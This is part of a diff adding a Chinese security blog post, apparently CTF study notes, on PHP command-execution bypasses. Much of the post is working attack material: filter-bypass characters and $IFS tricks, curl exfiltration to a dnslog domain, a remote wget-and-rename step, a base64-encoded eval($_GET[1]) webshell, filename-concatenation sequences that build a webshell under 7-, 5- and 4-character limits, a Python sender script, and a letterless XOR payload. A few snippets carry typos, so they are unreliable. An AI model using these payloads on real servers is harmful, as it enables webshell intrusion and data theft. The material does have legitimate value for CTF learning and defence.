+<span class="token function">exec</span> <span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>void passthru(string command, int &amp;return_var)</code><ul>
+<li>command是要执行的命令</li>
+<li>return_var存放执行命令后的状态值</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>string shell_ exec (string command)</code><ul>
+<li>command 是要执行的命令</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">she1l_exec</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li><strong>``</strong> 两个反引号<ul>
+<li>与shell_exec功能相同，执行shell命令并返回输出的字符串</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'pwd'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> `<span class="token variable">$a</span>`<span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<ul>
+<li><code>bool ob_start([callback $output_callback [,int $chunk_size [, bool $erase ]]])</code><ul>
+<li>ob_start 打 开输出控制缓冲</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token variable">$cmd</span> <span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span>
+<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"$_GET[a]"</span><span class="token punctuation">;</span>
+<span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<h4 id="4-命令执行的绕过"><a href="#4-命令执行的绕过" class="headerlink" title="4.命令执行的绕过"></a>4.命令执行的绕过</h4><ul>
+<li>php代码中包含system()命令，但是预定义了使用的函数，此时的绕过方法</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$rce</span> <span class="token operator">=</span><span class="token string">"echo"</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li>绕过的符号</li>
+</ul>
+<pre><code>换行符  %0a
+回车符  %0d
+连续指令  ;(分号)
+后台进程  &amp;
+管道符  |
+（逻辑判断符号） ||  &amp;&amp;</code></pre><ul>
+<li>拼接方式绕过</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">a=l;b=s;$a$b  //拼接ls</code></pre>
+<ul>
+<li>base64 绕过</li>
+</ul>
+<pre><code>`echo d2hvYW1p|base64 -D`  //将whoami的base64解码后再用反引号(``)执行</code></pre><ul>
+<li><code>substr string pos len</code></li>
+</ul>
+<pre><code>echo  &quot;${PATH:0:1}&quot;   //取PATH，从0位开始，取一位
+echo  `expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1` //百度expr的用法，此处好像不怎么能用哈</code></pre><h4 id="5-命令执行的空格代替"><a href="#5-命令执行的空格代替" class="headerlink" title="5.命令执行的空格代替"></a>5.命令执行的空格代替</h4><ul>
+<li><code>&lt;</code>符号</li>
+<li><code>$IFS 、${IFS} 、$IFS$9</code>：$9  意思是第九个参数</li>
+<li><code>%09</code>  用于url传递</li>
+</ul>
+<h4 id="6-命令执行无回显的方法"><a href="#6-命令执行无回显的方法" class="headerlink" title="6.命令执行无回显的方法"></a>6.命令执行无回显的方法</h4><ul>
+<li><p>判断：</p>
+<ul>
+<li>延时</li>
+<li>HTTP请求：dnslog</li>
+<li>DNS 请求：dnslog（dnslog.cn）  curl。。。。</li>
+</ul>
+</li>
+<li><p>利用：</p>
+<ul>
+<li>写shell（直接写入/外部下载，需要联网）</li>
+<li>http/dns等方式带出数据（通过构造curl xxxx.dnslog的域名，把数据带出）</li>
+<li>注意xxxx.dnslog  中不能有空格，所以用sed命令将空格替换  <code>cat flag.php|sed s/[[:space:]]//</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="7-可控字符串长度受限下getshell"><a href="#7-可控字符串长度受限下getshell" class="headerlink" title="7.可控字符串长度受限下getshell"></a>7.可控字符串长度受限下getshell</h4><ul>
+<li><p>使用 <code>ls &gt; 1</code>进行命令执行测试</p>
+</li>
+<li><p>15个字符：限制字符长度，可能没有限制命令执行次数</p>
+<ul>
+<li>在远程wget一个文件，然后再执行一次改名的命令  <code>wget a.cn/1</code> <code>mv 1 1.php</code></li>
+<li>直接写入getshell-php <code>echo 1234 &gt;&gt;q.php</code>，一次写不全就多追加几次（<code>eval($_GET[1]);</code>）</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+highlight_ <span class="token function">file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+<span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'too long'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<ul>
+<li>7个字符：限制字符长度，可能没有限制命令执行次数<ul>
+<li>思路 <code>ls&gt;a</code>会把ls的内容输入到a中</li>
+<li><code>l&gt;a</code>：因为<code>l</code>不是命令，所以不会有内容，但是同样会生成a文件</li>
+<li>通过 <code>l&gt;a</code>  <code>l&gt;b</code>等操作，生成一堆文件（文件名组合起来是一句话，一句话配合base64进行上传）配合 <code>\</code>进行命令拼接，命令拼接好放到一个中，用sh  执行文件，生成一句话或完成其他工作</li>
+<li><code>ls -t</code>会按照文件最新的时间进行排序显示（解决了文件名的顺序问题）</li>
+<li>再通过<code>ls -t &gt;a</code>命令，将文件名组合一起，放入某php文件中（实现getshell）</li>
+</ul>
+</li>
+</ul>
+<pre><code>echo PD9waHAgZWNhbCgkX0dFVFsxXSk7 | base64 -d &gt;1.php
+
+
+//PD9waHAgZWNhbCgkX0dFVFsxXSk7</code></pre><pre><code>w&gt;hp                  //file.txt 文件
+w&gt;l.p\\
+w&gt;d\&gt;\\               //此处容易出错，会显示有\n  回车
+w&gt;\ -\\
+w&gt;e64\\                //注意：eval($_GET[1]);   经过base64编码后为 ZXZhbCgkX0dFVFsxXSk7
+w&gt;bas\\                //在shell脚本中，\\的意思是命令换行分割，（可以与下一行的字符拼接到一块组成命令）
+w&gt;7\|\\
+w&gt;k\\
+w&gt;xXS\\
+w&gt;VFs\\
+w&gt;0dF\\
+w&gt;gkX\\
+w&gt;hbC\\
+w&gt;ZWN\\
+w&gt;HAg\\
+w&gt;9wa\\
+w&gt;PD\\
+w&gt;o\ \\             //此处有空格
+w&gt;ech\\
+ls -t&gt;0             //使用-t进行排序
+sh 0
+                    //这个脚本意思是把那句shell输出到 0 文件中，然后最后一句用sh执行0文件，生成一句话</code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">import</span> requests
+url1 <span class="token operator">=</span> <span class="token string">"http://xx.xx.xx.xx/index.php?1="</span>
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> <span class="token keyword">in</span> f<span class="token punctuation">:</span>
+        url <span class="token operator">=</span> url1<span class="token operator">+</span> i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true">#print "已经请求%S" % url</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://xx.xx.xx.xx/1.php"</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token punctuation">:</span>
+    <span class="token keyword">print</span> <span class="token string">'ok'</span>
+</code></pre>
+<ul>
+<li>5个字符，思路与7个字符的一样，只是 <code>ls -t&gt;f</code>，不符合标准，所以，在输入上面的命令之前，先构造一个能执行 <code>ls -t &gt;f</code>的shell（a），然后生成其他文件名，执行<code>a</code>（执行ls -t&gt;0），生成最终的get-shell。完成。<ul>
+<li>关键是拆分<code>ls -t&gt;f</code> 命令</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//相关PHP代码</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf'</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<pre class=" language-shell"><code class="language-shell">//5个字符：
+>ls\\
+ls>a           //由于文件名顺序的影响，先将"ls\"写入到a中
+>\ \\
+>-t\\
+>\>f
+ls>>a          //此处将“ ”、“-t\”、“>f”、“ls”追加到a中
+sh a           //此shell即可实现 ls -t>v的功能
+
+
+               //此时将7个字符的命令重新组合，然后生成文件名即可
+               // echo PD9waHAgZWNhbCgkX0dFVFsxXSk7 | base64 -d >1.php
+>php
+>1.\\
+>\>\\
+>\ \\
+>-d\\
+>\ \\
+>64\\
+>se\\
+>ba\\
+>\ \\
+>\|\\
+>\ \\
+>k7\\
+>XS\\
+>sx\\
+>VF\\
+>dF\\
+>X0\\
+>gk\\
+>bC\\
+>Nh\\
+>ZW\\
+>Ag\\
+>aH\\
+>9w\\
+>PD\\
+>\ \\
+>ho\\
+>ec\\
+...
+               //文件名生成完成以后，使用sh a执行ls -t>f 语句，生成可“生成get-shell”的文件
+sh a
+sh f          //执行生成的f</code></pre>
+<ul>
+<li>4个字符，思路类似于5个字符的，但是更难一点<ul>
+<li>拆分 <code>ls -th&gt;f</code></li>
+<li>注意：<code>*</code> 命令会将当前目录下的文件作为命令和参数输入。 <code>*v</code>同理<ul>
+<li>如果当前目录下有一个文件名为<strong>ls</strong>，则在命令行中输入 <strong>***就会执行</strong>ls**命令（将文件名作为命令执行）</li>
+</ul>
+</li>
+<li><code>dir</code>命令类似与<code>ls</code>，但显示时有些不同，输出内容之间带有空格</li>
+<li><code>rev</code>命令将文件内容倒序输</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">//4个字符：
+>dir
+
+        //此三句就是将 ls -th >f  拆分后倒过来写的，为了控制文件名顺序
+>f\>
+>ht-
+>sl
+
+        //注意：此时目录中的文件为  dir  f>  ht-  sl
+*>v     //  * 的意思就是将这些文件名组合为一句命令并执行，就是执行“dir  f>  ht-  sl”
+        //使用输入输出重定向将结果输出到v文件中。（结果是  “f>  ht-  sl”）
+
+>rev
+
+*v>a    //组合的语句是“rev v>a”  意思：倒序输出v中内容，写入到a中，就是“ls -th>f”，完成ls语句构造
+
+        //此时将7个字符的命令重新组合，然后生成文件名即可
+        // echo PD9waHAgZWNhbCgkX0dFVFsxXSk7 | base64 -d >1.php
+
+>
+>
+>
+
+
+...
+
+        //文件名生成完成以后，使用sh a执行ls -th>f 语句，生成可“生成get-shell”的文件
+sh f    //执行生成的f</code></pre>
+<h4 id="8-无字母数字get-shell"><a href="#8-无字母数字get-shell" class="headerlink" title="8.无字母数字get-shell"></a>8.无字母数字get-shell</h4><ul>
+<li>思想：生成字母——将非字母数字的字符通过各种变换，最终能构造出a-z中任意一个字符<ul>
+<li>异或：0^1 = 1；1^1 = 0；0^0 = 0；任何值与0异或，返回的都是它本身的值，将不同字符进行异或，得到新ASCII码，可为字母。</li>
+<li>取反：使用SQL中宽字节的思路，中文会变成%xx%xx，此时可使用 <code>‘和’[1]</code>输出<strong>和</strong>这个字符串的第一个字符，<code>ord(‘和’[1])</code>转换为ASCII码，将该ASCII码取反，会得到一个新的ASCII码，该ASCII码可为字母。</li>
+<li>自增： i++</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//题目</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//$hint = "php function getFlag() to get flag";</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>获取字符异或的结果：</p>
+<pre class=" language-p&amp;amp;#39;y"><code class="language-p&amp;amp;#39;y">//获取字符异或的结果：
+a="~!@#$%^&*()_+=-`{}[]|\/?.,<>;:"
+for i in xrange(len(a)):
+    for j in xrange(len(a)):
+        if ( ord(a[i]) ^ ord(a[j]) )>64 and ( ord(a[i]) ^ ord(a[j]) )<91:
+            print "%s xor %s = %d"%( a[i],a[j],ord(a[i]) ^ ord(a[j]))
+        elif ( ord(a[i]) ^ ord(a[j]) )>96 and ( ord(a[i]) ^ ord(a[j]) )<122:
+            print "%s xor %s = %d"%( a[i],a[j],ord(a[i]) ^ ord(a[j]))
+</code></pre>
+<pre><code>//上题的解题关键，绕过过滤，传入getFlag()
+//找到对应的字符
+&lt; xor [ = g  103
+&gt; xor [ = e  101
+] xor ) = t  116
+= xor { = F  70
+@ xor , = l  108
+^ xor ? = a  97
+&lt; xor [ = g  103
+//所以getFlag可以表示为：
+&#39;&lt;&gt;]=@^&lt;&#39; ^ &#39;[[){,?[&#39;
+//但是此时函数缺少括号()，在php中，将字符串复制给变量，然后变量后面跟一个括号，就可以作为函数来执行
+//此时传入的参数为：
+$_=&#39;&lt;&gt;]=@^&lt;&#39; ^ &#39;[[){,?[&#39;;$_()
+//payload为：
+code=$_=&#39;&lt;&gt;]=@^&lt;&#39;^&#39;[[){,?[&#39;;$_();</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://blog.aloogu.com" rel="external nofollow noreferrer">kylin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://blog.aloogu.com/2020/03/26/ming-ling-zhi-xing/">http://blog.aloogu.com/2020/03/26/ming-ling-zhi-xing/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="http://blog.aloogu.com" target="_blank">kylin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                                    <span class="chip bg-color">命令执行</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/03/26/fan-xu-lie-hua/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="反序列化">
+                        
+                        <span class="card-title">反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            年代也不近了，学习一下吧，或许能增加新思路。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/26/wen-jian-bao-han/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="文件包含">
+                        
+                        <span class="card-title">文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            也是好久没见过的东西了，PHP还火吗？
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">文件包含</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('100')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: kylin小小鱼<br />'
+            + '文章作者: kylin<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="http://blog.aloogu.com" target="_blank">kylin</a>
